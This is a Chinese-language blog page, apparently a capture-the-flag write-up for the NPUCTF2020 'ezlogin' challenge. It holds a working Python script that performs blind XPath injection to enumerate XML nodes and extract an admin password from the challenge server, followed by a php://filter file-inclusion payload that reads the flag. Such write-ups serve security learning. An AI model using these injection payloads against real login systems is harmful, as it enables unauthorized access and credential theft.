@@ -1,0 +1,186 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[NPUCTF2020]ezlogin - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[NPUCTF2020]ezlogin
+sql注入之xpath注入
+
+http://phoebe233.cn/index.php/archives/35/
+就是和xml实体注入差不多，登录的信息都在,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[NPUCTF2020]ezlogin</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[NPUCTF2020]ezlogin</h1>
+        <div class="stuff">
+            <span>七月 11, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><ul>
+<li>sql注入之xpath注入</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://phoebe233.cn/index.php/archives/35/">http://phoebe233.cn/index.php/archives/35/</a></p>
+<p>就是和xml实体注入差不多，登录的信息都在bp抓包的post参数那里，具体看这篇博客，贴上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sess = requests.session()</span><br><span class="line">strs=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFZHIJKLMNOPQRSTUVWKYZ1234567890&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">param=<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span></span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strs:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url=<span class="string">&#x27;http://4fb3bc61-7d66-4e44-bdab-afc5bf2ca97d.node3.buuoj.cn/login.php&#x27;</span><span class="comment">#注意加login.php</span></span><br><span class="line">            token=re.findall(param,sess.get(url).text)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment">#第一个根节点为root</span></span><br><span class="line">            <span class="comment">#data=&quot;&lt;username&gt;&#x27; or substring(name(/*[1]), &#x27;&quot;+str(i)+&quot;&#x27;, 1)=&#x27;&quot;+str(s)+&quot;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#第二个节点为accounts</span></span><br><span class="line">            <span class="comment">#data = &quot;&lt;username&gt;&#x27; or substring(name(/root/*[1]), &#x27;&quot; + str(i) + &quot;&#x27;, 1)=&#x27;&quot; + str(s) + &quot;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#第三个节点为user</span></span><br><span class="line">            <span class="comment">#data = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/*[1]), &#x27;&quot; + str(i) + &quot;&#x27;, 1)=&#x27;&quot; + str(s) + &quot;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#遍历[1][2][3],在user节点下得到id，username，password</span></span><br><span class="line">            <span class="comment">#data = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[1]), &#x27;&quot; + str(i) + &quot;&#x27;, 1)=&#x27;&quot; + str(s) + &quot;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#之后取user下的子节点username（user[1]），得到 gtfly123</span></span><br><span class="line">            <span class="comment">#取第二个子节点user[2]结果是adm1n</span></span><br><span class="line">            data = <span class="string">&quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/password/text(), &#x27;&quot;</span> + str(i) + <span class="string">&quot;&#x27;, 1)=&#x27;&quot;</span> + str(s) + <span class="string">&quot;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot;</span> + token + <span class="string">&quot;&lt;/token&gt;&quot;</span></span><br><span class="line">            res=sess.post(url=url,headers=headers,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;非法操作&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                t+=s</span><br><span class="line">                print(t)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>然后找到了登录账号adm1n，密码gtfly123</p>
+<p>登陆后，文件包含，大小写绕过</p>
+<p>Php://filter/read=convert.Base64-encode/resource=/flag</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
